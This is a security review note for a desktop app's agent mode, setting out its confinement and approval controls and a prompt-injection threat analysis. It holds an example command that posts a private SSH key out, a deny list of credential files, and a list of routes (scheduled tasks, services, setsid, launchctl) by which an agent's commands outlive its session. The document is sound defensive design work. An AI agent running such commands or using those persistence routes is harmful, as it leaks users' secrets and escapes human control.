# Agent mode: security notes for the security review

Agent mode is off by default and is not offered in a release until the agent and tool-use
security review signs off. The review asks two things of any tool-calling feature before it ships:

1. a named design pattern, and
2. a written prompt-injection analysis.

This file provides both for the desktop's agent mode, as of agent contract 1.2.0. The README's
"Agent mode" section describes how the feature works. This file describes what stops it from going
wrong.

## The design pattern

**Host-enforced confinement with native approval, and no filesystem or shell plugin in the
webview.** The model plans freely. Every action it takes goes through a fixed set of seven tools,
and a native host the model and the webview cannot reach into decides whether each call runs. This
is the action-selector pattern, applied per tool class, with a human in the loop for the classes
that change anything:

| Tool class | Tools | Who decides |
|---|---|---|
| Read | `read_file`, `list_dir`, `glob`, `grep` | The host, by confinement. No question, except for a read-gated path in a mode not confirmed for the folder (below). |
| Write | `edit`, `write_file` | The mode. A native dialog in `ask`. A native dialog in every mode, `yolo` included, for a protected path. |
| Shell | `run_shell` | A native dialog in `ask` and `auto-edit`, with the command shown whole. Unasked only in `yolo`, which the person turns on natively once per folder per session and which is never saved. |

What makes this hold:

- **The host is the only actor.** The SPA runs the loop: it calls `/v1`, and `/v1` hands back
  `tool_calls` without running them. The SPA can only call one narrow Tauri command per tool. Each
  command is named in `build.rs` and in the capability file, and is granted only to the main
  window's bundled pages. No `fs`, `shell`, `dialog` or `http` plugin is exposed. A test holds the
  lists together.
- **Confinement in Rust** (`confine.rs`), a port of the SDKs' `confine` held to the contract's 56
  `conformance.paths` cases. It refuses the following:
  - `..` segments and absolute paths outside the root.
  - Links (symbolic links, and junctions on Windows) that lead out of the root.
  - The deny list (`.env*`, `*.pem`, `id_*`, `.git/` and `.matterwaveignore`). It applies to
    reads as well as writes, ignores case, and checks a path by its own name and by where its
    links lead.
  - On every platform, a name Windows would read as another file: an alternate data stream, a
    trailing dot or space, a device name, or a UNC or verbatim path.
  - A write to a protected path, unless the person approved that write natively.

  Search (`search.rs`) is a port of the SDKs' walker. It applies the ignore files from the root
  down, case-insensitively. It never enters a denied directory and never follows a link to a
  directory.
- **Native approval** (`approval.rs`). The host raises an OS dialog from inside the command. Script
  in the webview cannot see, answer or dismiss it:
  - Cancel is the default button.
  - A command is shown whole, or refused if it is too long to show whole.
  - Hidden and bidirectional characters are spelled out as `<U+XXXX>`.
  - After a yes, a write is computed again and lands only if the file is still byte for byte what
    the dialog showed.
- **The mode is fixed when a run starts.** The host refuses any tool the mode does not offer, so
  `plan` is read-only whatever the webview sends.
- **The org's switch is enforced by the host.** Before a run starts, the host asks MatterWave
  itself, with the credential in the OS keychain, for `/api/me`'s `local_agent_tools`. It refuses
  when the answer is false, and also when it cannot ask: signed out, offline, or an error. The
  webview's greyed-out toggle is a courtesy, not the control.
- **Every answer is logged.** Each native answer is appended to `agent-approvals.log` in the app's
  data directory:
  - Each line records the time, the question, the tool, the path or the command's SHA-256 (never
    the command), the mode, the root, the stored conversation, and the result.
  - The file is owner-only: 0600 in a 0700 folder on Unix, and a protected one-entry DACL on
    Windows.
  - The log is rotated at 1 MiB, and two old files are kept.
  - A yes the log cannot record is not acted on.
  - When the run is stored, the tool result also says the person approved the call, so the
    conversation on the server keeps the record too.
- **The page cannot talk to anyone but MatterWave.** At launch the host pins the CSP's
  `connect-src` to `'self'`, the IPC bridge and the origin of `MW_DESKTOP_BASE_URL`, for every
  build (`pin_connect_src` in `lib.rs`). The committed config names no remote host at all. Sign-in,
  token refresh, the updater and the org check are native requests, which the CSP does not govern.
  No other host is needed.

## Prompt-injection analysis

### The trifecta

The review frames the risk as the lethal trifecta. Agent mode completes all three legs, and that is why
it is gated:

1. **Private data.** The workspace folder holds source code and anything else the person keeps
   there, and the machine holds far more.
2. **Untrusted content.** The model reads files it did not write: a cloned repository's README,
   comments, test fixtures, `AGENTS.md`, and command output. Any of them can carry instructions
   aimed at the model.
3. **An exfiltration channel.** In order of reach:
   - Everything the model reads goes to MatterWave and the model's provider.
   - A command can reach the network.
   - A write can plant something that a later run, a build or a shell executes.
   - Script in the webview could post data to any host.

No filter is relied on to spot injected text; the review rules that out. The controls below limit what
an injected instruction can cause.

### What each control covers

| Threat | Control | Leg it cuts |
|---|---|---|
| Injected text makes the model run a command that sends data out (`curl -d @~/.ssh/id_rsa ...`) | `run_shell` asks natively in `ask` and `auto-edit`, with the whole command and its folder shown. It runs unasked only in `yolo`. | Exfiltration (the person is the gate) |
| Injected text makes the model read secrets in the folder and repeat them | The deny list refuses `.env*`, keys and `.git/` for reading as well as writing. `.matterwaveignore` adds more. In `plan` and `ask`, reading the agent's settings, shell startup files and credential folders (`.ssh/`, `.aws/`, `.bashrc` ...) needs a native yes, and search leaves them out. | Private data |
| Injected text makes the model plant instructions for the next run (`AGENTS.md`), a login hook (`.bashrc`) or a credential (`.ssh/authorized_keys`) | These are protected paths. A write to one asks natively in every mode, `yolo` included. | Persistence |
| A path that names one file in the dialog but writes another (`key.pem:x`, `NUL`, `a.txt.`, `\\?\`, a link swapped in after the check, a hard link out) | Windows aliases are refused on every platform. Links are resolved and confined at preview and again at apply. A write lands beside the target and is renamed over it, with the folder checked again. | Approval integrity |
| The model's output becomes script in the page (a rendering bug), or a dependency is compromised, and that script calls the agent commands directly | Every gate is in Rust. Script can start a run only in `plan` or `ask`, and the host checks the org first. It can read what those modes read without asking, but not the read-gated paths. Everything that writes or runs asks natively. | All three, at the host |
| That script sends what it read to its own server | `connect-src` is pinned to MatterWave's origin, and the page has no other network path. | Exfiltration |
| The org has turned local agent tools off, and a modified SPA ignores it | The host asks `/api/me` itself before every run, and refuses on false or when it cannot ask. | Policy |
| Someone disputes what was approved | The owner-only approval log, plus the note in a stored run's tool results. | Audit |
| A runaway command, or one that hides in the background | Stop and the timeout kill the whole process tree, and so does the command's own exit. See "Process survival" below for the limits. | Containment |

### Residual risks

These remain, and are why the feature stays off by default:

- **An approved command is not sandboxed.** It runs as the person and can reach anything they can,
  including the OS keychain that holds the app's own sign-in. The dialog is the control, and it
  depends on the person reading the command. Execution isolation is tracked separately.
- **`yolo` removes the human from commands and writes**, except writes to protected paths. In
  `yolo`, injected text can make a command run unasked. The mode is opt-in per folder per session,
  never saved, and its dialog says commands are not sandboxed.
- **`auto-edit` writes unasked.** A write is checkpointed and can be undone with `/restore`, but it
  can still plant code that a build or test command, approved later, will run. The command's dialog
  is the last gate.
- **Reads go to the model's provider.** The deny list is a floor, not a guarantee. A secret in an
  ordinary file (`config.yaml`) is read like any other text. The content still stays with
  MatterWave and the provider; the webview cannot send it elsewhere.
- **The read gate covers a fixed list**, the contract's protected home-folder entries. A credential
  stored elsewhere in the folder is protected only by the deny list and `.matterwaveignore`.
- **Instructions in context files.** A trusted folder's `MATTERWAVE.md`, `MATTERWAVE.local.md` and
  `AGENTS.md` go into the system prompt. They are fenced, the prompt says they cannot change the
  mode or what the tools reach, and the folder is trusted only after a native "Trust this folder".
  They can still steer the model within what the mode allows.
- **Prompt injection is not detected**, only contained. A model that has been steered can still
  propose harmful but approvable actions, phrased to look routine.
- **Dialog fatigue.** A person who approves every prompt without reading it turns `ask` into
  `yolo`. Showing commands whole and spelling out hidden characters helps, but does not prevent
  this.
- **The log is local and owned by the person.** It records what was answered, not what the model
  intended. Anyone who can write as that user can edit it. The server-side note exists only for
  stored runs.

### Process survival

Stop, the timeout and the command's own exit end everything the command started, with these
limits:

- **Windows.** The shell is created suspended, joins a kill-on-close job object, and is then
  resumed, so every descendant is in the job. Breakaway is not allowed. The job cannot hold a
  process that another service starts on the command's behalf:
  - WMI (`Win32_Process.Create`, `Invoke-WmiMethod`, `Invoke-CimMethod`).
  - The Task Scheduler (`schtasks /create ... /run`, `Register-ScheduledTask`).
  - Services (`sc create`, `New-Service`) and COM out-of-process servers.
  - An elevated `Start-Process -Verb RunAs`, which goes through the consent service.
  - A document handed to an already-running Explorer or browser.

  These outlive Stop. A scheduled task or service can also persist across reboots. Only command
  approval (or not using `yolo`) covers them.
- **Linux.** The command runs in its own process group, killed with `SIGKILL` on Stop. Best effort
  on top of that: when the app runs in a cgroup v2 the person owns (a systemd user session
  delegates one to each app), the command starts in a child cgroup of its own, joined before
  `exec`. Stop writes `cgroup.kill`, which also ends processes that left the group with `setsid` or
  a double fork. Without delegation (cgroup v1, a container, some desktop sessions), or for a
  process started through `systemd-run --user`, `at`, `cron` or a D-Bus activated service, the
  process group is all there is.

  A child subreaper is deliberately not used. It would adopt every detached process the app starts,
  including the browser opened for sign-in. It could not tell one run's processes from another's,
  and it would leave zombies to reap.
- **macOS.** The command runs in a process group. A process that calls `setsid`, or one started
  through `launchd` (`launchctl`, `open -a`), outlives Stop.

### What is not covered by code

Some of the threats above can only be contained, not closed, by the controls described here:

- **Sandboxing approved commands.** Commands run unsandboxed; isolation is tracked separately.
- **Checking the meaning of a command or a diff.** Nothing in the code judges whether a command or
  diff is safe; that is the person's job in the dialog.
- **Reboot-surviving persistence by a command.** A command the person approved can create a
  scheduled task, a service, a launch agent or a crontab entry.
- **Exercising the dialogs on macOS and Linux.** The native dialogs follow the dialog plugin's
  threading, but they have been exercised by hand only on Windows. CI runs the host's suite on
  Windows, macOS and Linux, but it cannot click a dialog.
